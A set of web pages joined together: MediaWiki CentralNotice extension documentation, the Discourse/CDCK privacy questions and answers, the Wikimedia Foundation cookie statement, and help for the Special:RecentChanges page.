From a user facing perspective, the high level CentralNotice objects are campaigns (a.k.a. notices) and banners (a.k.a. templates). These are affected by the back end concepts of selectors and allocation.

 * Banner — a single block of translatable html/wikitext/css/javascript that will display at the top of Manual:$wgContentNamespaces pages. The user status, device type, UI language selectors are applied to banners.
   * Banners may be grouped by category. All banners in a category share user side cookies, such as the hiding cookie that is set when a user clicks a banner close button.
 * Campaign — a collection of banners. The project, country and content language selectors apply at the campaign level. The system allows as many active campaigns at the same time as you want dynamically calculating an allocation for each banner in an active campaign. Campaigns are defined as active if the central wiki time is greater than the campaign start time, less than the campaign end time, and the campaign is marked as enabled.
   * Banners in a campaign are assigned a bucket and weight. Buckets are yet another selector, and weight affects the relative allocation of banners inside a campaign.
   * There are four priority levels in CentralNotice. Higher priority campaigns will get a greater allocation of page views.
   * Campaigns may be locked which will prevent editing and deletion of the campaign; but not the banners inside a campaign.
 * Selector — any property which may be filtered on for the purposes of allocation. This allows, for example, different banners to be shown to logged in versus logged out users in Argentina browsing Wikipedia in English.
   * A selection vector is the complete set of selectors a user presents to the central wiki when requesting a banner.
 * Allocation — The chance a banner will be shown to a user under a given selection vector.


DESIGN DOCUMENTS

 * Design Research Project 2017
 * Banner allocation algorithm
 * Database schema / table layout


GEOIP LOOKUP

By default, CentralNotice has no client-side GeoIP lookup service configured. This is optimised for the Wikimedia Foundation production configuration where Varnish populates the Geo cookie from the server-side. (See wikitech:Geolocation.) You can configure CentralNotice to use a custom data source client-side through the CentralNoticeGeoIPBackgroundLookupModule configuration variable. This variable expects the name of a ResourceLoader module that exports a function. The function will be called without parameters and should return a Promise that resolves with an object containing the following properties:

 * country: string - Two-letter country code.
 * region: string - Implementation specific.
 * city: string - City name.
 * lat: number.
 * lon: number.


USAGE

Full usage instructions can be found at meta:Help:CentralNotice.


NEW BANNER

 1. Load Special:CentralNoticeBanners
 2. Click on the add banner link at the bottom of the page (must be logged in as an admin).
 3. Enter in a name and the raw HTML for the given banner.
    1. If this banner is going to be translated then enclose any text to be translated with triple parens - {{{FOO}}}.
 4. Submit

(TODO: move and expand this snippet)

 * Each banner has its banner definition stored in MediaWiki:Centralnotice-template-<name>
 * All of its messages are stored below the banner defined in MediaWiki:Centralnotice-template-<name>-<message>/<language_code>


NEW CAMPAIGN

 1. Load Special:CentralNotice
 2. Add a campaign with a given start time at the bottom portion of the page, leave a comment, and click submit.
    1. If this campaign is only run on a specific wiki and or language then select it from the pull downs.
 3. Click on the new campaign and add the banners you want within this running campaign and their respective weights.
 4. If all looks well then set this campaign to enabled and it will show at the corresponding time.


OVERRIDING SELECTION

Add any of the following URL parameters to preview a specific banner, defeat "diet" schemes, or debug pseudorandom banner selection.

banner You can test a banner directly on any wiki by adding ?banner=<bannername> to the end of the URL. randomcampaign A decimal number between 0 and 1, to be used as the "random" seed for choosing a campaign. randombanner A decimal number between 0 and 1, to be used as the "random" seed for choosing a banner among banners available in the chosen campaign. country Override the country code, before filtering to geotargeted campaigns. Accepts two-character ISO 3166-1 codes. uselang Its usual meaning in MediaWiki, this determines which banners you may be shown. Beware of content language vs. user language. force Override any banner hiding code, show the banner. reset Zero out any cookies being used to customize banner display (e.g. delivered impression count).

For example,

 * [1]
 * https://it.wikisource.org/wiki/Speciale:RandomRootpage?randomcampaign=0.142


DEBUGGING PROBLEMATIC BANNERS

If there is a problematic banner in the page, you can identify which banner is active by opening your developer console and inspecting the value of: mw.centralNotice.bannerData.bannerName.


LIMITATIONS

Banners do not display on pages in the Special namespace, as well as edit pages and diff pages.

WHAT IS CDCK?

CDCK is the company home and primary developer of Discourse, open source software for hosting Internet discussion forums. As a company, CDCK hosts forums using Discourse for customers, as well as:

 * meta.discourse.org, a discussion forum about Discourse itself,
 * discourse.org, a website marketing Discourse and CDCK’s hosting service,
 * blog.discourse.org, CDCK’s blog,
 * and rubytalk.org, a mirror of the “Ruby-Talk” mailing list for the Ruby programming language.




WHO IS RESPONSIBLE FOR DATA COLLECTED ABOUT ME?

CDCK is the responsible party, or controller, for the data we collect and process for our own purposes. For instance, CDCK is responsible for data about our customers, employees, open source contributors, and visitors to our own websites and forums.

Importantly, CDCK sets only its own privacy practices, not the privacy practices of CDCK customers or others who host forums using our open source software. You should ask all of those involved in administering and hosting Discourse forums that you use for information about their privacy practices.

Privacy inquiries or notices you send to CDCK about forums we host on behalf of our customers will be referred to the appropriate responsible party.




HOW DOES CDCK COLLECT DATA ABOUT ME?

CDCK collects data about you:

 * when you browse a forum that CDCK hosts

 * when you create and use an account on a forum that CDCK hosts

 * when you post, send private messages, and otherwise participate in a forum that CDCK hosts

 * when you visit our website at discourse.org

 * when you sign up for mailing lists and announcements

 * when you purchase services from us

 * when you contribute to our open source software

CDCK collects data when you use forums that Discourse hosts, whether you use the forums using a web browser on your own computer, or use CDCK’s Discourse apps for mobile devices.

CDCK does not buy or otherwise receive data about you from data brokers.




DOES CDCK SELL MY PERSONAL INFORMATION OR SHARE IT TO SERVE BEHAVIORAL ADVERTISING?

No, CDCK does not sell personal information or share it with third parties for the purpose of cross-context behavioral advertising.




WHAT PERSONAL INFORMATION DOES CDCK COLLECT, AND WHY?




CDCK COLLECTS DATA ABOUT VISITS TO FORUMS AND TO ITS WEBSITES.

When you visit one of CDCK’s websites or a forum that CDCK hosts, whether you have an account or not, we use cookies, server logs, and other methods to collect data about what pages you visit and when.

CDCK uses data about how you use the website to:

 * optimize the forum, so that it’s quick and easy to use

 * diagnose and debug technical errors

 * defend the forum and CDCK’s websites from abuse and technical attacks

 * compile statistics on forum and topic popularity

 * compile statistics on the kinds of software and computers visitors use

CDCK usually stores the data identified above for just a few weeks. In special circumstances, like extended investigations about technical attacks, CDCK may preserve log data longer, for analysis. CDCK stores aggregate statistics about use of the forum for as long as CDCK hosts the forum, but those statistics don’t include data identifiable to you personally.




CDCK COLLECTS FORUM ACCOUNT DATA.

Many features of forums that CDCK hosts require a forum account. For example, most forums that CDCK hosts require an account to post and reply to topics.

To sign up for a forum account, Discourse requires your name, a user name, and an e-mail address.

CDCK uses your account data to identify you on the forum and to create pages specific to you, such as your profile page. If the forum is public, CDCK publishes your account data according to the forum administrator’s configuration. If the forum is access-restricted, CDCK makes your account data available to everyone who can access the forum, according to the forum administrator’s configuration.

CDCK uses your e-mail address to:

 * notify you about posts and other activity on the forum

 * reset your password and help keep your account secure

 * contact you in special circumstances related to your account

 * contact you about legal requests, like DMCA takedown requests

You may provide additional data for your account, like a short biography, your location, or your birthday, on the profile settings page for your account. CDCK makes that data available to others who can access the forum. You don’t have to provide this additional information, and you can erase it at any time.

CDCK stores your account data as long as your account remains open.




CDCK COLLECTS CUSTOMER ACCOUNT DATA.

When you purchase hosting from CDCK, we require certain information from you, including your email address and the information we require to process payments, such as your name and credit card information. We use this information to perform the contract between us, and store it as long as your customer account remains open.




CDCK COLLECTS DATA ABOUT POSTS AND OTHER ACTIVITY ON THE FORUM.

CDCK collects the content of your posts, plus data about bookmarks, likes, and links you follow in order to share that data with others, through the forum. If the forum is public, CDCK publishes your activity. If the forum is access-restricted, or access restrictions apply to the specific post, CDCK makes your activity available only to users permitted to see it.

CDCK also collects data about private messages that you send through the forum. CDCK makes private messages available to senders and their recipients, and also to forum administrators.

CDCK stores your posts and other activity as long as your account remains open.




CDCK COLLECTS DATA YOU GIVE TO SIGN UP FOR MAILING LISTS AND ANNOUNCEMENTS.

When you fill out and submit a web form to sign up for mailing lists or announcements, CDCK collects the information you put in the form, such as your e-mail address.




CDCK DOES NOT COLLECT SENSITIVE PERSONAL INFORMATION.

CDCK does not intentionally collect or process sensitive personal information, such as government identification numbers, information on racial or ethnic origin, political opinions, genetic data, biometric data, health data, or any of the special categories of personal data specified by the GDPR.




CDCK COLLECTS DATA ABOUT OPEN SOURCE CONTRIBUTORS

Contributors to CDCK’s open source software may be asked to provide identifying and contact information such as your name, email address, telephone number, and mailing address. CDCK also collects and stores information concerning your agreement to our contributor license agreement.

CDCK uses this information to maintain the integrity of our software and software licenses, as well as the integrity of the license agreement between CDCK and our contributors. CDCK stores contributor information for as long as related contributions are incorporated into CDCK’s open source software.




CDCK USES COOKIES.

HTTP cookies are small bits of data that websites, like Discourse forums, send to your computer when you visit. When you return to those websites, your computer sends the cookies on your computer back to the website.

Discourse.org uses these cookies:

Discourse forums that configure Google Analytics, such as meta.discourse.org, also use cookies from Google. Refer to Google’s page on Google Analytics cookies for the latest details.

Discourse forums that serve advertisements, such as with the ads plugin, may also set cookies used to track you and serve advertisements.

Your web browser can show you the cookies you have for any website and help you manage them.




DOES CDCK USE PERSONAL INFORMATION FOR MARKETING PURPOSES?

CDCK may use personal information about our customers and prospective customers in order to directly market our own services and inform you about new products and features that we offer. We also use the information you give to sign up for our mailing lists and announcements to send those messages.

You can always opt out of marketing communications from us, and you have the right to object to any processing of your information for marketing purposes.




HOW CAN I MAKE CHOICES ABOUT DATA COLLECTION?

You can make choices about how data about you is used on the settings page for your account. When a forum uses access restrictions that vary by category, you can choose who will see your post by choosing the appropriate category.

Most web browsers let you make choices about whether to accept cookies, for specific websites or more generally. aboutcookies.org has instructions for many different web browsers. youronlinechoices.eu and aboutads.info have more information specifically about cookies used for advertising.

CDCK does not respond to the Do Not Track HTTP header.




WHERE DOES CDCK STORE DATA ABOUT ME?

Most forums that CDCK hosts store data in CDCK’s data centers and Amazon Web Services S3 in the United States. Some forums that CDCK hosts store data in data centers in other jurisdictions, such as Canada and the European Union. Refer to the Privacy Policy of the forum on which your account exists for detailed information.




DOES CDCK COMPLY WITH THE EU GENERAL DATA PROTECTION REGULATION?

CDCK respects privacy rights under Regulation (EU) 2016/679, the European Union’s General Data Protection Regulation (GDPR). Information that GDPR requires CDCK to give can be found throughout this privacy notice, including information on the rights of data subjects.




WHAT ARE MY RIGHTS UNDER THE GDPR?

The GDPR provides the following rights with respect to personal information about you that we collect or process:

 * the right to access your personal data

 * the right to rectification of inaccurate or incomplete personal data

 * the right to erasure of your personal data

 * the right to data portability

 * the right to restrict the processing of your personal data

 * the right to object to certain processing of your information, including automated decision-making and direct marketing

 * the right to lodge a complaint with a supervisory authority

Information on how to exercise these rights is provided throughout this notice and linked above. While CDCK strives to make these rights easy to exercise on your own through your account settings, for more complicated inquiries the best option will be to contact us.




HOW DOES CDCK SAFEGUARD INTERNATIONAL DATA TRANSFERS AFTER SCHREMS II?

CDCK relies on the European Commission’s standard contractual clauses for international transfers(SCCs) to legally transfer personal data out of the European Economic Area. Because national security and surveillance laws may be in conflict with European data protection rules, CDCK continually reassesses the practical reach of these laws to ensure our data transfers are adequately safeguarded.

Currently:

 * CDCK processes personal data on servers located outside the European Union.

 * CDCK uses subprocessors with personnel and computers outside the European Union.

 * CDCK has personnel in the United States, Australia, and other non-EU countries without EU adequacy decisions under GDPR. These people need access to forum personal data in order to keep forums running, address security concerns, respond to privacy-related requests from users, field technical support requests, and otherwise assist customers.

 * CDCK no longer participates in Privacy Shield, following its invalidation as an adequate safeguard for EU-US data transfers.

 * CDCK’s standard data processing addendum incorporates the standard contractual clauses.

 * CDCK is very likely subject to section 702 of the Foreign Intelligence Surveillance Act in the United States, a law that the European Court of Justice has found inadequately protects the rights and freedoms of data subjects.

 * CDCK has never received any order or request for personal data under FISA 702 or any similar national security or surveillance law of any other country. CDCK is not subject to any court order or legal obligation that would prevent it from disclosing the existence or non-existence of such an order or request.

 * CDCK has adopted a policy for how we will respond to those orders and requests, in case we ever receive one. CDCK will suspend processing, notify any customer for forums we host for others, minimize disclosure, and resist disclosure of personal data, all as the law allows.




DOES CDCK COMPLY WITH THE CALIFORNIA CONSUMER PRIVACY ACT AND OTHER US STATE COMPREHENSIVE PRIVACY LAWS?

CDCK is not presently a “business” for the purposes of the California Consumer Privacy Act (CCPA) or a “controller” directly subject to other US state comprehensive privacy laws. But we may act as a service provider for CCPA “businesses” or as a processor for “controllers” subject to other US state comprehensive privacy laws when we host forums on behalf of customers. We offer standard data processing terms for customers who are CCPA “businesses” or “controllers” subject to other US state comprehensive privacy laws.

Where we process personal information for our customers, CDCK complies with its obligations as a service provider under the CCPA and as a processor under other US state comprehensive privacy laws. CDCK does not sell your personal information.

If we process your personal information on behalf of one of our customers and you would like to make a related inquiry or exercise choices that customer may provide, please contact the customer that you interact with directly. Information on features that our customers may offer, depending on their settings, with respect to your personal information — such as accessing personal information, requesting disclosure about information CDCK collects, and requesting deletion of your personal information — can be found throughout this privacy notice.




WHERE CAN I ACCESS DATA ABOUT ME?

You can see your account data at any time by visiting your account page on the forum. Your account page also lists your posts and other activity on the forum.

Your account activity page also includes a link to download all of your activity in standard comma-separated values format.

If you do not have account with us but have a data access request, please contact us.




HOW CAN I CHANGE OR ERASE DATA ABOUT ME?

You can change your account data at any time by visiting the profile settings page for your account. The settings for a particular forum may also allow you to close your account, on the settings page for your account. Closing your account starts a process of erasing or anonymizing CDCK’s records of data you provided for your account. Forum administrators can also erase and anonymize accounts.

Depending on the settings for your particular forum, you may also be able to edit, anonymize, or erase your posts. When you edit posts, CDCK will keep all versions of your posts. Forum administrators can view old versions of posts, and optionally make them visible to other forum visitors.




DOES CDCK MAKE AUTOMATED DECISIONS BASED ON DATA ABOUT ME?




CDCK CLASSIFIES POSTS AS SPAM AUTOMATICALLY.

CDCK uses data about your posts and other activity on many forums to make automated decisions about whether your posts to meta.discourse.org and most forums that CDCK hosts are spam. When Akismet decides that a post is likely spam, the forum refuses to accept the post.

If you think a post has been wrongly blocked or removed, contact an administrator of your forum. They can override the decision that a post was spam.




CDCK USES DATA ABOUT POSTS AND ACTIVITY TO SET TRUST LEVELS AUTOMATICALLY.

Depending on how administrators of your forum configure the forum, the forum may use data about your posts and activity to award you badges and calculate a trust level for your account. Your trust level may affect how you can participate in the forum, such as whether you can upload images, as well as give you access to moderation and management powers in the forum. Your trust level therefore reflects forum administrators’ confidence in you, and their willingness to delegate community management functions, like moderation.

If you think your trust level has been set incorrectly, contact an administrator of your forum. They can manually adjust the trust level of your account.




CDCK USES COMMUNITY FLAGS TO HIDE POSTS AND SILENCE USERS AUTOMATICALLY.

Depending on how administrators of your forum configure it, your posts may be automatically hidden, or your ability to post automatically suspended, as a result of your posts being flagged by other users.




DOES CDCK SHARE DATA ABOUT ME WITH OTHERS?

CDCK shares account data with others as mentioned in the section about account data.

CDCK shares data about your posts and other forum activity with others as mentioned in the section about forum data.

CDCK uses the subprocessors listed on our subprocessors page when providing forums on behalf of our customers. We may also share personal data with the service providers we use in order to transact with customers, host our website, deliver content, secure our services, store data, host and manage our open source project, market our services, and provide customer support. These service providers include:

 * Akismet, for spam filtering
 * Amazon Web Services, for storage
 * GitHub, for open source development
 * Google, for analytics and storage
 * Stripe, for processing payments
 * Plausible, for anonymous, aggregate website analytics




HOW DOES CDCK DOCUMENT COMPLIANCE FOR FORUM HOSTING CUSTOMERS?

CDCK provides a standard data processing addendum for European Union General Data Protection Regulation compliance on request. The addendum incorporates the non-EU/non-EEA processor standard contractual clauses of Commission Decision 2010/87/EU for any regulated transfers.




HOW CAN I CONTACT CDCK ABOUT PRIVACY?

You can send questions, requests, and complaints via email to privacy@discourse.org.

European Users with questions or complaints about GDPR compliance can also contact CDCK via mail to:

Civilized Discourse Construction Kit, Inc.
ATTN: GDPR Inquiry
Vijzelstraat 68
1017HL Amsterdam
The Netherlands


For complaints under GDPR, European Union users may lodge complaints with their local data protection supervisory authorities.




HOW CAN I FIND OUT ABOUT CHANGES?

This version of CDCK’s privacy questions and answers took effect January 21, 2025.

CDCK will post the next version at https://meta.discourse.org/privacy. CDCK may change how it announces changes in future versions.

As stated in our Privacy Policy, Wikimedia believes strongly in the values of privacy and transparency. To that end, we have created this Cookie Statement as a clear reference guide to the use of cookies on Wikimedia Sites. This Cookie Statement explains how we use cookies (and other locally stored data technologies), how we use third-party cookies, and how you can manage your cookie options. For more information on our privacy practices, please visit our Privacy Policy.

The Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, actively collects some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage.


WHAT IS A COOKIE?

A "cookie" is a tiny data file that we transfer onto your computer, mobile phone, or any other device that you use to access the Wikimedia Sites, and is generally used for authentication and tracking. Every cookie expires after a certain period of time, but that period varies depending on what the cookie is used for and how your browser is configured.

Cookies are often categorized based on how long they remain active before they expire. A "session" cookie is one that generally expires when you close your web browser or mobile application. A "persistent" cookie is one that remains in your device, even after you close your browser or mobile application.  A persistent cookie expires according to the duration set by us, or when you delete it manually. You can learn more about cookies on Wikipedia.

You may remove or disable cookies through your browser settings. For more information on how to manage your cookie options, please see Section 3 of this Cookie Statement below.

For more information on this and other key terms that may be relevant, please read through our Privacy Policy Glossary.


WHAT TYPES OF COOKIES DOES WIKIMEDIA USE AND FOR WHAT PURPOSES?

Cookies are not required in order to read or edit the Wikimedia Sites. We use the information we receive from cookies and other locally stored data technologies to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and interactions with the Wikimedia Sites, and to generally improve our services. Cookies are required in order to login and for your edits to be associated to a user account; without cookies, your edits will be anonymous and unassociated with an account.

We use cookies, JavaScript, tracking pixels, and other locally stored data technologies to accomplish different purposes. Below is a list of the categories of cookies we use and what they are used for.

Functionality:

These cookies help the Wikimedia Sites work and are essential in order to enable you to move around the Wikimedia site and use their features. These cookies are useful for remembering your username in the login field, maintaining your session and remembering previous actions, keeping you logged in (if selected), and more.

Here are a few examples:

Name Expires Category What does it do? centralauth_Token

{$wgCookiePrefix}* Token

365 days, if the user chooses 'Keep me logged in'. Otherwise omitted. Functionality Provides 'Keep me logged in' functionality. {$wgCookiePrefix}* UserID, UserName 365 days, if the user chooses 'Keep me logged in'. Otherwise 30 days. Functionality Helps identify you to the wiki, and keeps you logged in. loginnotify_prevlogins 180 days Functionality Verifies that you are logging in from a known device.

This affects the threshold for how many unsuccessful login attempts trigger a notification to the user.

centralauth_Session

{$wgCookiePrefix}* Session

When user exits browser Functionality Manage sessions. Provides functionality such as logging in to Wikimedia Projects.

Preferences:

These cookies store your preferences, so that they can be remembered the next time you use the Wikimedia Sites, for a more customized experience. These cookies are useful for recognizing and maintaining your language preference, remembering changes you have made to text size, fonts and other display preferences, so we can provide you with the look and feel that you want, and more.  

Here are a few examples:

Name Expires Category What does it do? mwclientpreferences 30 days Preferences Stores user preferences for client-side settings, such as font size, dark mode, and width (wide or standard). This cookie ensures a customized browsing experience for anonymous users. For more details, see the decision record. stopMobileRedirect 30 days Preferences Tells us not to redirect to the mobile site if you do not like that. uls-preferences Local Storage, not a cookie Preferences Allows you to set preferences for the Universal Language Selector functionality. hidewatchlistmessage- [watchlistMessageId]

● where watchlistMessageld is the Id of the message being hidden

28 days Preferences Allows a user to hide a watchlist message. userFontSize Local Storage, not a cookie Preferences Keeps track of your preferred font size on the mobile site. preferredEditor Local Storage, not a cookie Preferences Keeps track of your preferred editor on the mobile site.

Performance and Analysis:

These cookies count the number of visitors and collect information about how you use the Wikimedia Sites. This allows us to better understand your user experience on the Wikimedia Sites and helps us improve them for you and other users — for instance, by making sure users are finding what they need easily. Other examples include:

 * remembering pages visited, and actions taken on the Wikimedia sites so we can optimize the pages;
 * remembering if users get error messages from web pages;
 * storing your most recently read articles directly on your device, so they can be retrieved quickly;
 * remembering the topics searched so that we can optimize the search results we deliver to you;
 * remembering the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.

Here are a few examples:

Name Expires Category What does it do? centralnotice_bucket 7 days Performance and Analysis Helps us understand the effectiveness of notices provided to users through the CentralNotice extension. For more details, see Extension:CentralNotice ext.popups.core.previewCount Local Storage, not a cookie Performance and Analysis Helps us understand the effectiveness of Hovercards. WMF-Last-Access 30 days Performance and Analysis Helps us calculate Unique devices accessing our site. See: diff.wikimedia.org/2016/03/30/unique-devices-dataset/

Third-Party:

We will never use third-party cookies on our wikis unless we get your permission to do so. These cookies would allow us to render services provided by third parties, such as "like" and "share" buttons. When a third party provides these kinds of services, they may require the use of a cookie in order to provide their services.

If you ever come across a third-party cookie transferred to your device during your access of the Wikimedia wiki sites, where you did not take any action to authorize the use and/or transfer of that cookie  (such as one that may have been mistakenly placed by another user or administrator), please report that cookie to us at privacywikimedia.org.

A note about Wikimedia Foundation non-wiki sites:

Some non-wiki Wikimedia Foundation sites are hosted by a third-party service provider.

Sites hosted by WordPress VIP may have the WordPress Stats module enabled. Stats is a service that allows us to understand how many visitors we get to our WordPress-hosted non-wiki sites, their location by country, and which pages, posts and links are the most popular. Only the Wikimedia Foundation and the service provider, Automattic/WordPress, have access to the raw Stats data, which is retained for a maximum of 30 days. For more information about Stats, see WordPress' support page on the module.

Sites hosted by Civilized Discourse Construction Kit, Inc., known as Discourse forums, use cookies for functionality purposes and to store preferences. Only the Wikimedia Foundation and the service provider have access to the raw data. For more information about the cookies and their retention periods, see Discourse's information about cookies. Please note that the Wikimedia Foundation has not configured its Discourse forums to use Google Analytics, serve advertisements, or process donations; Discourse cookies related to those purposes are not used in our Sites.


WHAT ARE MY COOKIE OPTIONS?

While this is not a comprehensive list, below are some of the things that you can do to limit use of cookies and other locally stored data technologies on your device. While cookies and other locally stored data technologies may not be necessary to use our sites, some features may not function properly if you disable them.

You can:

 * remove or disable specific locally stored data on your browser's settings (you can reset your web browser to refuse all cookies or to indicate when a cookie is being sent);
 * use a browser that can block third-party cookies; or
 * install a plug-in to block locally stored data, if one is available.

Turning off the browser's cookies will prevent tracking pixels from tracking your specific activity. A tracking pixel may still record an anonymous visit from your IP address, but unique information will not be recorded. If you do not want to receive tracking pixels, you will need to disable HTML images in your browser-based email client, and that may affect your ability to view images in other emails that you receive.


WHERE CAN I FIND MORE INFORMATION?

Please read through our Privacy Policy for more information. If you have any further questions, contact privacywikimedia.org.

Thanks!

Recent changes is a special page that lists recent changes in reverse order, with change date and time, change in the page size, user who created the page, and edit summary. It also provides links to patrol these new edits when that feature is enabled.

This feature is accessible at Special:RecentChanges. The page results are adjustable using settings in the Preferences section "Recent changes".

You can choose which Recent Changes you want to display. You can combine different kinds of filters to display the results you want.


TRANSCLUSIONS

This special page can be transcluded, with the first unnamed parameter specifying how many entries should be displayed.

{{Special:RecentChanges/50}}


A wiki can be configured with aliases for the namespace "Special" and the title "Recent changes", and those localized versions can be used instead of the canonical ones.

Additional parameters may be used in a comma separated list such as:

{{Special:RecentChanges/days=5,limit=40,hidebots,hideminor}}


Even if a wiki is configured with aliases for the namespace and title, it is not possible to use localized parameters.

parameter value type description days integer Maximum number of days to display limit integer Maximum number of entries to display namespace integer Limit results to the specified namespace, or multiple namespaces separated by semicolons hidebots boolean Hide bots bots boolean Show bots hideminor boolean Hide minor edits minor boolean Show minor edits hideliu boolean Hide logged in users (LIU) hidepatrolled boolean Only show pages which have not been patrolled. hideanons boolean Hide Anonymous users hidemyself boolean Hide the logged in user's own changes hidecategorization boolean Hide page categorization tagfilter string Only get entries for that tag (T142878)


INTERFACE

The interface consists of two main parts:

 * At the top are the filters , which help you sort through edits.
 * Below that is the list of recent changes.


THE FILTERS




Filtering This page explains how the improved filtering interface works and how to get the most out of the new tools. Highlighting User-defined Highlighting tools let you use color to emphasize the edits that interest you most. The functions and techniques described on this page will help you to make your Recent Changes results more meaningful. Quality and Intent Filters "New filters for edit review" introduces two filter groups—Contribution Quality and User Intent—that are powered by machine learning and work differently from other filters. They offer probabilistic predictions about, respectively, whether or not edits are likely to contain problems and whether the user who made them was acting in good faith.

THE LIST OF RECENT CHANGES

When using the default preferences configuration, most of the page displays 50 lines, each representing an edit, arranged for left-to-right language wikis.

Below are examples of recent changes.

(diff) (hist) . . m Manual:$wgContentNamespaces; 07:07 . . (-35) . . Shirayuki (talk | contribs) (Reverted edits by Trangbe1992 (talk) to last version by 94rain) (Tag: Rollback) (thank) (diff) (hist) . . Reporting_security_bugs/pt-br; 06:53 . . (-40) . . 187.73.25.7 (talk) (Tag: Manual revert)

UNDERSTAND THE LIST

This shows 2 edits: the first by an administrator who is logged in, to the Manual:$wgContentNamespaces page; the second by an un-registered user to the Reporting security bugs/pt-br page.

From left to right:

 * The "diff" link takes you to the changes made in that edit; it's not available for new pages or page moves.
 * The "hist" link leads to the page's history, showing all edits, including older and newer ones. For page moves, it shows the history of the new page title.
 * A bold m indicates the user considered the edit "minor". Only users with the minoredit right (usually logged-in users) can mark edits as minor to prevent misuse.
 * A bold N shows the page is "new," meaning it didn't exist before.
 * The use of a bold b indicates edits made by a bot or hidden by an admin.
 * Bold ! indicates unpatrolled pages. See Help:Patrolled edits .
 * ORES is a tool used on some wikis to flag potentially harmful edits, showing them with a red "r" and a light yellow background.
 * A link to the current version of the page. Bold indicates it's on your watchlist.
 * "07:07" refers to UTC time. You can adjust it to your time zone in preferences .
 * (-35) Changes in bytes are shown as a green plus (+) sign for additions and a red minus (-) sign for removals.
 * Bold numbers highlight changes of more than 500 bytes.
 * For logged-in users, a link to their userpage is provided. For others, it's their User Contributions.
 * A link to the user's talk page is included.
 * For page moves, both the old and new titles are linked.

Recent changes can display up to 500 edits, or 5,000 if the URL is modified. Regardless of what filters are used, it cannot display edits older than $wgRCMaxAge (90 days by default, 30 days in Wikimedia wikis).


PAGE MOVES AND DELETIONS

Once a page has been renamed (moved), previous edits and the initial creation of the page appear in recent changes under the new name.

Once a page is deleted, previous edits and the initial creation of the page are no longer visible in recent changes or similar logs.


EDITS MADE BY BOTS

Bots can appear in recent changes if you include &hidebots=0" in the URL. Sysops can label certain edits as bot edits, so they won't appear in the usual recent changes. See Help:Reverting for more details.


ADVANCED FEATURES


HIDE THE FILTERS

Users can choose not to use the filters by clicking "Hide" on the filters panel. Users can opt out of the new filters by going to the "Advanced options" section at the bottom of Special:Preferences on the wikis they are active on and selecting "Use non-JavaScript interface".

The old configuration documentation is available for users.


WEB FEED

To get web feeds (RSS and Atom) for a wiki's recent changes, add "&feed=rss" or "&feed=atom" to the URL of the recent changes page. This shows the differences for several edits, each with a link to the current page. Some browsers may offer options like sorting by author. See also Syndication for more details.


DIFFERENCES FROM PAGE HISTORY

Each line in the page history represents a single change made to the page and the version that resulted from it.

 * "prev" is similar to "diff" mentioned earlier.
 * "cur" shows the changes between this version and the latest one, including all edits made afterward, even those not listed in this revision history because they happened after loading this page.

The "cur" and "prev" features resemble those in the improved recent changes , except for the "cur" in the initial line: it isn't linked in the revision history, unlike in the improved recent changes where it shows the changes from the last edit.

See Places where the edit summary appears.
